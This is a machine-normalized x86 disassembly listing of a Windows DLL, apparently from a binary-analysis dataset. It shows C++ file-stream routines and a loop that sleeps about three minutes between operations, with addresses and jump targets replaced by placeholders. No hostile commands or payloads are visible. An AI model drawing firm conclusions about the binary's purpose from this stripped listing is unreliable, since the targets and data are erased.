mov [ ebp - 0x14 ] 0xf
call sub_100021a7
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_10029a19
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1002b392
retn
push [ esi + 0x4c ]
call sub_10029a19
pop ecx
cmp eax 0xffffffff
jne r-xdata
movzx eax al
jmp r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ ebp - 0x18 ]
mov ebx eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov ecx [ esi + 0x3c ]
mov edx [ ecx ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2d ]
push eax
lea eax [ ebp - 0x34 ]
push eax
add edi ebx
push edi
push [ ebp - 0x38 ]
lea eax [ esi + 0x44 ]
push eax
call [ edx + 0x10 ]
test eax eax
jl r-xdata
or esi 0xffffffff
xor edi edi
inc edi
cmp eax edi
jle r-xdata
lea eax [ ebp - 0x2d ]
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x3c ] eax
jne r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x34 ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x5c ]
push eax
call sub_10008213
mov ecx eax
call sub_10006ccf
mov ecx [ ebp - 0x34 ]
sub ecx eax
push ecx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001f47
cmp [ ebp - 0x18 ] edi
jb r-xdata
test edi edi
jg r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008213
push edi
mov ecx eax
call sub_10006ccf
push eax
lea eax [ ebp - 0x2d ]
push edi
push eax
call sub_100272f3
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x34 ]
push [ esi + 0x4c ]
dec edi
movsx eax [ edi + eax ]
push eax
call sub_100299a7
pop ecx
pop ecx
movzx esi [ ebp - 0x2d ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax esi
jmp r-xdata
sub_1000e80d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
lea edi [ esi + 0x40 ]
xor ebx ebx
cmp [ eax ] edi
jne r-xdata
cmp [ esi + 0x4c ] ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_1000eca9
test al al
je r-xdata
cmp [ esi + 0x3c ] ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
dec [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x4c ]
call sub_10029ba7
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10029c2c
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_1000e8ce
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi ecx
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
cmp [ esi + 0x4c ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_1000eca9
test al al
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10029c9a
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp edi ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10029c2c
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x1
push edi
push [ esi + 0x4c ]
call sub_10029ba7
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ esi + 0x44 ] eax
mov eax [ esi + 0x20 ]
lea ecx [ esi + 0x40 ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] ecx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_1000e9a2
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
cmp [ esp + 0x8 ] ecx
jne r-xdata
push [ esp + 0xc ]
push ecx
push [ esp + 0x10 ]
push eax
call sub_10029cdf
add esp 0x10
test eax eax
jne r-xdata
cmp [ esp + 0xc ] ecx
jne r-xdata
push edi
mov edi [ esi + 0x4c ]
push 0x1
call sub_1000ec65
mov eax esi
pop edi
jmp r-xdata
push 0x4
pop ecx
pop esi
retn 0x8
sub_1000e9e9
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call sub_10029f67
pop ecx
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
retn
sub_1000ea14
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_1000ef88
mov esi eax
mov eax [ esi ]
pop ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax edi
mov [ edi + 0x3c ] esi
call sub_1000c55f
and [ edi + 0x3c ] 0x0
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_1000ea44
push 0x4
mov eax sub_10051b5f
call sub_1002b2a6
mov ebx ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea edi [ esi + 0x4 ]
push edi
add ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_1000c4f3
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_1000c19c
mov eax edi
mov [ edi ] r--data
mov [ edi + 0x48 ] 0x0
mov [ edi + 0x41 ] 0x0
call sub_1000c55f
mov eax [ rw-data ]
and [ edi + 0x4c ] 0x0
and [ edi + 0x3c ] 0x0
mov [ edi + 0x44 ] eax
or ebx 0x2
push ebx
push [ ebp + 0xc ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_1000eba2
test eax eax
jne r-xdata
mov eax esi
call sub_1002b37e
retn 0x8
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_100080a5
or ecx 0x4
sub_1000eb09
push 0x4
mov eax sub_1004fe94
call sub_1002b2a6
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_1000e37e
mov eax [ esi - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x4 ] r--data
call sub_1002b37e
retn
sub_1000eba2
push 0x0
mov eax sub_100503e6
call sub_1002b2a6
mov esi ecx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
xor eax eax
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10022f14
add esp 0xc
test eax eax
je r-xdata
push 0x1
mov edi eax
call sub_1000ec65
lea eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_1000edfc
and [ ebp - 0x4 ] 0x0
push eax
call sub_1000ef88
mov edi eax
mov eax [ edi ]
pop ecx
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax esi
mov [ esi + 0x3c ] edi
call sub_1000c55f
and [ esi + 0x3c ] 0x0
jmp r-xdata
call sub_1002b37e
retn 0x8
lea ecx [ ebp + 0xc ]
call sub_10007dbd
mov eax esi
jmp r-xdata
sub_1000ec1c
push ebx
push esi
mov esi eax
xor ebx ebx
push edi
mov edi esi
cmp [ esi + 0x4c ] ebx
je r-xdata
xor edi edi
call sub_1000eca9
test al al
jne r-xdata
push [ esi + 0x4c ]
call sub_1002a03a
pop ecx
test eax eax
je r-xdata
xor edi edi
mov eax esi
mov [ esi + 0x48 ] bl
mov [ esi + 0x41 ] bl
call sub_1000c55f
mov eax [ rw-data ]
mov [ esi + 0x44 ] eax
mov eax edi
pop edi
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] ebx
pop esi
pop ebx
retn
sub_1000ec65
cmp [ esp + 0x4 ] 0x1
mov [ esi + 0x41 ] 0x0
sete al
mov [ esi + 0x48 ] al
mov eax esi
call sub_1000c55f
test edi edi
je r-xdata
mov eax [ rw-data ]
and [ esi + 0x3c ] 0x0
mov [ esi + 0x4c ] edi
mov [ esi + 0x44 ] eax
retn 0x4
lea eax [ edi + 0x8 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
lea eax [ edi + 0x4 ]
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
sub_1000eca9
push 0x4c
mov eax sub_1004fd68
call sub_1002b30f
xor edi edi
cmp [ esi + 0x3c ] edi
je r-xdata
mov al 0x1
cmp [ esi + 0x41 ] 0x0
je r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0x4 ]
cmp eax 0xffffffff
jne r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_10005cd0
mov [ ebp - 0x4 ] edi
xor al al
jmp r-xdata
mov [ esi + 0x41 ] 0x0
dec eax
je r-xdata
call sub_1002b392
retn
cmp [ esi + 0x41 ] 0x0
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
push [ esi + 0x4c ]
push edi
push 0x1
push eax
call sub_10029834
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ ebp - 0x34 ]
sub edi eax
je r-xdata
dec eax
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
test edi edi
jne r-xdata
xor bl bl
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
mov al bl
jmp r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ ebp - 0x1c ]
mov ebx eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov ecx [ esi + 0x3c ]
mov edx [ ecx ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x34 ]
push eax
add edi ebx
push edi
push [ ebp - 0x38 ]
lea eax [ esi + 0x44 ]
push eax
call [ edx + 0x18 ]
sub eax 0x0
je r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_100014aa
jmp r-xdata
sub_1000ee0f
push 0x1c
mov eax sub_10051e0f
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x20 ] ecx
jle r-xdata
mov [ ebp - 0x18 ] ebx
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
xor edi edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov edi esi
call sub_1000f20a
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + esi + 0x28 ]
mov eax [ ebp + 0xc ]
call sub_1000f120
movzx eax [ eax ]
push eax
mov ecx ebx
call sub_1000f140
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov cl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x1c ] cl
push [ ebp - 0x1c ]
mov ecx eax
call sub_1000f140
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_1000f1ac
mov eax esi
call sub_1002b37e
retn
push ebx
push [ ebp - 0x14 ]
call sub_100081bf
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov [ eax + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
inc edi
xor ebx ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
xor ebx ebx
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov cl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov [ ebp + 0xc ] cl
push [ ebp + 0xc ]
mov ecx eax
call sub_1000f140
cmp eax 0xffffffff
jne r-xdata
cmp edi [ ebp - 0x20 ]
jae r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_1000ef56
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000ef88
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000f025
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1000f025
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x2
pop eax
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] ebx
call sub_100078da
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1000f0c3
push 0x4
mov eax sub_1004fa10
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_1000f120
push esi
mov esi eax
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10027827
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop esi
retn
sub_1000f140
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ esp + 0x4 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
retn 0x4
sub_1000f1ac
push 0x0
mov eax sub_10051af7
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_1002b64c
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_1000f17d
call sub_1002b37e
retn 0x4
lea ecx [ eax + 0x4 ]
call sub_10021d73
sub_1000f20a
push 0x0
mov eax sub_10051af7
call sub_1002b2a6
mov ebx [ ebp + 0x8 ]
mov [ ebx ] edi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ eax + 0x4 ]
call sub_10021d6a
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0x8 ] 0x0
sete al
mov [ ebx + 0x4 ] al
mov eax ebx
call sub_1002b37e
retn 0x4
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov esi eax
call sub_1000cd22
sub_1000f29b
push 0x4
mov eax sub_100512c2
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10002255
push [ ebp + 0xc ]
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_100025cf
push r--data
lea ecx [ esi + 0x3c ]
mov [ ebp - 0x4 ] 0x2
call sub_10001362
push r--data
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001362
add edi 0x70
push edi
lea eax [ esi + 0x74 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10001384
mov eax esi
call sub_1002b37e
retn 0x8
sub_1000f32a
push esi
push edi
mov edi ecx
lea esi [ edi + 0x74 ]
mov [ edi ] r--data
call sub_100015ca
push [ esi ]
call sub_100272e8
pop ecx
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ edi + 0x58 ]
call sub_1000264e
push 0x0
push esi
lea ecx [ edi + 0x3c ]
call sub_1000264e
push 0x0
push esi
lea ecx [ edi + 0x20 ]
call sub_1000264e
push 0x0
push esi
lea ecx [ edi + 0x4 ]
call sub_100020e2
mov [ edi ] r--data
pop edi
pop esi
retn
sub_1000f37c
push ebp
sub esp 0xc8
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xc8 ] eax
push 0x70
mov eax sub_10052b4f
call sub_1002b2d9
mov eax [ ebp + 0xd4 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xd8 ]
mov esi ecx
mov [ ebp - 0x24 ] eax
lea eax [ esi + 0x74 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x60 ] r--data
call sub_10001384
xor ebx ebx
push ebx
push 0x1
mov [ ebp - 0x4 ] ebx
call sub_10001bf4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
lea ecx [ ebp - 0x44 ]
mov [ eax ] ecx
jmp r-xdata
lea ecx [ ebp - 0x60 ]
call sub_1000f5ca
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xc8 ]
xor ecx ebp
call sub_10027150
add ebp 0xcc
leave
retn 0x8
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
push ebx
mov [ ebp - 0x4 ] 0x1
call sub_1002930b
push eax
call sub_1002a0b6
pop ecx
pop ecx
lea eax [ ebp - 0x60 ]
call sub_1000f68e
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x18 ] ebx
lea ecx [ ebp + 0x90 ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000f5ed
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
push eax
lea ecx [ ebp + 0x4 ]
mov [ ebp ] r--data
call sub_10002255
lea eax [ esi + 0x20 ]
push eax
lea ecx [ ebp + 0x20 ]
mov [ ebp - 0x4 ] 0x6
call sub_100025cf
lea eax [ esi + 0x3c ]
push eax
lea ecx [ ebp + 0x3c ]
mov [ ebp - 0x4 ] 0x7
call sub_100025cf
lea eax [ esi + 0x58 ]
push eax
lea ecx [ ebp + 0x58 ]
mov [ ebp - 0x4 ] 0x8
call sub_100025cf
lea eax [ ebp + 0x90 ]
push eax
lea ecx [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0x9
call sub_100025cf
push ebx
lea ecx [ ebp + 0xac ]
mov [ ebp + 0xc4 ] 0xf
call sub_100021a7
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x11 ] bl
jne r-xdata
push 0x2bf20
call [ Sleep@IAT ]
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001ebc
lea eax [ ebp + 0xac ]
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xc
call sub_10013c7d
push ebx
push 0x1
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xb
call sub_100020e2
lea eax [ ebp + 0xac ]
push eax
push [ ebp - 0x20 ]
lea ecx [ ebp ]
call sub_10013c7d
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
mov [ ebp - 0x11 ] 0x1
call sub_100020e2
lea ecx [ ebp ]
call sub_10013c31
push ebx
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x24 ]
push 0xffffffff
push ebx
lea eax [ ebp + 0xac ]
push eax
call sub_100021c3
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
call sub_100020e2
lea ecx [ ebp ]
call sub_10013c31
push ebx
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_1000264e
cmp [ ebp + 0xc0 ] ebx
jbe r-xdata
inc [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x4c ]
sub eax [ ebp - 0x50 ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x18 ] eax
jae r-xdata
sub_1000f5bd
mov esi [ ebp - 0x1c ]
xor ebx ebx
mov eax [ ebp - 0x4c ]
sub eax [ ebp - 0x50 ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x18 ] eax
jae r-xdata
lea ecx [ ebp - 0x60 ]
call sub_1000f5ca
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xc8 ]
xor ecx ebp
call sub_10027150
add ebp 0xcc
leave
retn 0x8
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea ecx [ ebp + 0x90 ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000f5ed
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
push eax
lea ecx [ ebp + 0x4 ]
mov [ ebp ] r--data
call sub_10002255
lea eax [ esi + 0x20 ]
push eax
lea ecx [ ebp + 0x20 ]
mov [ ebp - 0x4 ] 0x6
call sub_100025cf
lea eax [ esi + 0x3c ]
push eax
lea ecx [ ebp + 0x3c ]
mov [ ebp - 0x4 ] 0x7
call sub_100025cf
lea eax [ esi + 0x58 ]
push eax
lea ecx [ ebp + 0x58 ]
mov [ ebp - 0x4 ] 0x8
call sub_100025cf
lea eax [ ebp + 0x90 ]
push eax
lea ecx [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0x9
call sub_100025cf
push ebx
lea ecx [ ebp + 0xac ]
mov [ ebp + 0xc4 ] 0xf
call sub_100021a7
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x11 ] bl
jne r-xdata
push 0x2bf20
call [ Sleep@IAT ]
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001ebc
lea eax [ ebp + 0xac ]
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xc
call sub_10013c7d
push ebx
push 0x1
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xb
call sub_100020e2
lea eax [ ebp + 0xac ]
push eax
push [ ebp - 0x20 ]
lea ecx [ ebp ]
call sub_10013c7d
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
mov [ ebp - 0x11 ] 0x1
call sub_100020e2
lea ecx [ ebp ]
call sub_10013c31
push ebx
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x24 ]
push 0xffffffff
push ebx
lea eax [ ebp + 0xac ]
push eax
call sub_100021c3
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
call sub_100020e2
lea ecx [ ebp ]
call sub_10013c31
push ebx
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_1000264e
cmp [ ebp + 0xc0 ] ebx
jbe r-xdata
inc [ ebp - 0x18 ]
jmp r-xdata
sub_1000f5ed
push 0x18
mov eax sub_10051273
call sub_1002b2a6
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi edx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
cmp [ esi + 0x38 ] eax
jne r-xdata
